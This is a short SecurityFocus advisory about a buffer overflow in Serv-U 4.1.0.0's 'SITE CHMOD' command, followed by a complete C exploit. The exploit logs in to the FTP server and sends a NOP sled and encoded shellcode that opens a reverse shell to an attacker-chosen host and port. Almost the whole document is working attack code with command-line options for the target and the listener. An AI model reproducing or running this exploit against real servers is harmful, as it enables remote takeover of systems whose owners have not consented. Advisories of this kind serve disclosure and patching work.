source: http://www.securityfocus.com/bid/9483/info

RhinoSoft Serv-U FTP Server is reportedly prone to a buffer overflow. The issue exists when a \'site chmod\' command is issued on a non-existant file. If an excessively long filename is specified for the command, an internal buffer will be overrun, resulting in a failure of the FTP server. Execution of arbitrary code may be possible. 

/*
software:       Serv-U 4.1.0.0
vendor:         RhinoSoft, http://www.serv-u.com/
credits:        kkqq <kkqq@0x557.org>, http://www.0x557.org/release/servu.txt
greets:         rosecurity team, int3liban
notes:          should work on any NT, reverse bindshell, terminates the process
author:         mandragore, sploiting@mandragore.solidshells.com
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <fcntl.h>
#include <unistd.h>

#define fatal(x) { perror(x); exit(1); }

unsigned char sc[]={
// reverse bindshell, 204 bytes, uses import table
0x33,0xC0,0x04,0xB6,0x68,0xE2,0xFA,0xC3,0xCC,0x68,0x80,0x36,0x96,0x46,0x50,0x68,
0x8B,0x34,0x24,0xB9,0xFF,0xD4,0xF2,0xF1,0x19,0x90,0x96,0x96,0x28,0x6E,0xE5,0xC9,
0x96,0xFE,0xA5,0xA4,0x96,0x96,0xFE,0xE1,0xE5,0xA4,0xC9,0xC2,0x69,0x83,0xE2,0xE2,
0xC9,0x96,0x01,0x0F,0xC4,0xC4,0xC4,0xC4,0xD4,0xC4,0xD4,0xC4,0x7E,0x9D,0x96,0x96,
0x96,0xC1,0xC5,0xD7,0xC5,0xF9,0xF5,0xFD,0xF3,0xE2,0xD7,0x96,0xC1,0x69,0x80,0x69,
0x46,0x05,0xFE,0xE9,0x96,0x96,0x97,0xFE,0x94,0x96,0x96,0xC6,0x1D,0x52,0xFC,0x86,
0xC6,0xC5,0x7E,0x9E,0x96,0x96,0x96,0xF5,0xF9,0xF8,0xF8,0xF3,0xF5,0xE2,0x96,0xC1,
0x69,0x80,0x69,0x46,0xFC,0x86,0xCF,0x1D,0x6A,0xC1,0x95,0x6F,0xC1,0x65,0x3D,0x1D,
0xAA,0xB2,0xC6,0xC6,0xC6,0xFC,0x97,0xC6,0xC6,0x7E,0x92,0x96,0x96,0x96,0xF5,0xFB,
0xF2,0x96,0xC6,0x7E,0x99,0x96,0x96,0x96,0xD5,0xE4,0xF3,0xF7,0xE2,0xF3,0xC6,0xE4,
0xF9,0xF5,0xF3,0xE5,0xE5,0xD7,0x96,0x50,0x91,0xD2,0x51,0xD1,0xBA,0x97,0x97,0x96,
0x96,0x15,0x51,0xAE,0x05,0x3D,0x3D,0x3D,0xF2,0xF1,0x37,0xA6,0x96,0x1D,0xD6,0x9A,
0x1D,0xD6,0x8A,0x1D,0x96,0x69,0xE6,0x9E,0x69,0x80,0x69,0x46
};

char *user=\"anonymous\";
char *pass=\"not@for.you\";
char *path=\"/incoming\";

void usage(char *argv0) {
        printf(\"usage: %s -d <ip_dest> [options]\\n\",argv0);
        printf(\"options:\\n\");
        printf(\" -d target ip\\n\");
        printf(\" -p target port (default 21)\\n\");
        printf(\" -u username to log with (default %s)\\n\",user);
        printf(\" -s password to log with (default %s)\\n\",pass);
        printf(\" -w writable directory (default %s)\\n\",path);
        printf(\" -H listening host (default 127.0.0.1)\\n\");
        printf(\" -P listening port on host (default 80)\\n\");
        printf(\"\\n\");
        exit(1);
}

int main(int argc, char **argv) {
        struct sockaddr_in saddr;
        short port=21;
        int target=0, lhost=0x0100007f;
        int lport=80;
        char *buff;
        int s, ret, i;

        int delta=423;
        int callebx=0x10077A92; // libeay32.dll
        char jmpback[]=\"\\xe9\\xff\\xfe\\xff\\xff\\xeb\\xf9\\x90\\x90\"; // jmp -256
        char chmod[]=\"SITE CHMOD 777 \";

        printf(\"[%%]   Serv-u v4.1.0.0 sploit by mandragore\\n\");

        if (argc<2)
                usage(argv[0]);

        while((i = getopt(argc, argv, \"d:p:u:s:w:H:P:\"))!= EOF) {
                switch (i) {
                case \'d\':
                        target=inet_addr(optarg);
                        break;
                case \'p\':
                        port=atoi(optarg);
                        break;
                case \'u\':
                        user=optarg;
                        break;
                case \'s\':
                        pass=optarg;
                        break;
                case \'w\':
                        path=optarg;
                        break;
                case \'H\':
                        lhost=inet_addr(optarg);
                        break;
                case \'P\':
                        lport=atoi(optarg);
                        break;
                default:
                        usage(argv[0]);
                        break;
                }
        }

        if ((target==-1) || (lhost==-1))
                usage(argv[0]);

        printf(\"[.] if working you\'ll have a shell on %s:%d.\\n\", \\
                inet_ntoa(*(struct in_addr *)&lhost),lport);
        printf(\"[.] launching attack on ftp://%s:%s@%s:%d%s\\n\", \\
                user,pass,inet_ntoa(*(struct in_addr *)&target),port,path);

        lport=lport ^ 0x9696;
        lport=(lport & 0xff) << 8 | lport >>8;
        memcpy(sc+0x5a,&lport,2);

        lhost=lhost ^ 0x96969696;
        memcpy(sc+0x53,&lhost,4);

        buff=(char *)malloc(4096);

        saddr.sin_family = AF_INET;
        saddr.sin_addr.s_addr = target;
        saddr.sin_port = htons(port);

        s=socket(2,1,6);

        ret=connect(s,(struct sockaddr *)&saddr, sizeof(saddr));
        if (ret==-1)
                fatal(\"[-] connect()\");

        ret=recv(s,buff,4095,0);
        memset(buff+ret,0,1);
        printf(\"%s\",buff);
        
        sprintf(buff,\"USER %s\\r\\n\",user);
        printf(\"%s\",buff);
        send(s,buff,strlen(buff),0);

        ret=recv(s,buff,1024,0);
        memset(buff+ret,0,1);
        printf(\"%s\",buff);
        
        sprintf(buff,\"PASS %s\\r\\n\",pass);
        printf(\"%s\",buff);
        send(s,buff,strlen(buff),0);

        ret=recv(s,buff,1024,0);
        memset(buff+ret,0,1);
        printf(\"%s\",buff);

        if (strstr(buff,\"230\")==0) { 
                printf(\"[-] bad login/pass combinaison\\n\"); 
                exit(1); 
        }

        sprintf(buff,\"CWD %s\\r\\n\",path);
        printf(\"%s\",buff);
        send(s,buff,strlen(buff),0);

        ret=recv(s,buff,1024,0);
        memset(buff+ret,0,1);
        printf(\"%s\",buff);

        // verify directory
        sprintf(buff,\"PWD\\r\\n\",path);
        send(s,buff,strlen(buff),0);
        ret=recv(s,buff,1024,0);
        memset(buff+ret,0,1);
        i=strstr(buff+5,\"\\x22\")-buff-5;
        if (i!=1) i++;  // trailing /

        printf(\"[+] sending exploit..\\n\");

        bzero(buff,4096);
        memset(buff,0x90,600);
        strcat(buff,\"\\r\\n\");
        delta-=i; // strlen(path);
        memcpy(buff,&chmod,strlen(chmod));
        memcpy(buff+delta-9-strlen(sc),&sc,strlen(sc));
        memcpy(buff+delta-9,&jmpback,5+4);
        memcpy(buff+delta,&callebx,4);

        send(s,buff,602,0);
        
        ret=recv(s,buff,1024,0);
        if ((ret==0) || (ret==-1))
                fatal(\"[-] ret()\");
        memset(buff+ret,0,1);
        printf(\"%s\",buff);

        close(s);

        printf(\"[+] done.\\n\");

        exit(0);
}
